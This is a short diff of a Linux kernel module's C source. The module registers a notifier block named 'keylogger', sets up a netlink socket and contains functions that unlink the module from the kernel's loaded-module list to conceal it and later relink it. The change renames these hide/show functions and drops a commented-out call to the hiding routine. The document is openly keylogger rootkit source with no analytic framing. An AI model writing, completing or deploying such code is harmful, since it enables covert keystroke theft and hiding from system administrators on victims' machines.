@@ -4,14 +4,14 @@ static struct list_head *prev_module;
 struct sock *nl_sk = NULL;
 int pid;
 static struct notifier_block keylogger = {.notifier_call = notifier};
-void showme(void)
+void show_me(void)
 {
     list_add(&THIS_MODULE->list, prev_module);
 }
 /* Record where we are in the loaded module list by storing
  * the module prior to us in prev_module, then remove ourselves
  * from the list */
-void hideme(void)
+void hide_me(void)
 {
     prev_module = THIS_MODULE->list.prev;
     list_del(&THIS_MODULE->list);
@@ -52,7 +52,6 @@ static void mynetlink_recv_msg(struct sk_buff *skb)
 }
 static int __init mynetlink_init(void)
 {
-    //hideme()
     struct netlink_kernel_cfg cfg = {
         .input = mynetlink_recv_msg,
     };
